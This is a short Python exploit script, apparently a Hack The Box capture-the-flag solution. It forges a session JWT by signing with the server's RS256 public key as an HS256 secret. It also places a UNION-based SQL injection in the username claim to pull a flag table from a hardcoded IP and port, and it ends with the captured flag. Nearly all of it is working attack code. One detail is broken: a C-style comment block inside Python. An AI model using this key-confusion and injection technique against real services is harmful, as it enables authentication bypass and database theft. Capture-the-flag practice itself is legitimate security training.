import jwt, requests
import string

/*
  JWT Key Confusion Exploit(RS256 <> HS256) + SQL injection
*/

characters = string.ascii_lowercase + string.digits + ')(, }{_'
URL = 'http://134.122.104.185:31558/'

with open('public.key', 'r') as f:
	publicKey = f.read()

def sign(data): 
    return jwt.encode(data, publicKey, algorithm="HS256").decode()


payload = f"admin' union select null,group_concat(top_secret_flaag),null from flag_storage--"
cookies = sign({"username":payload,"pk":publicKey})
res = requests.get(URL, cookies={"session": cookies}).text

print(res)
# HTB{d0n7_3xp053_y0ur_publ1ck3y}
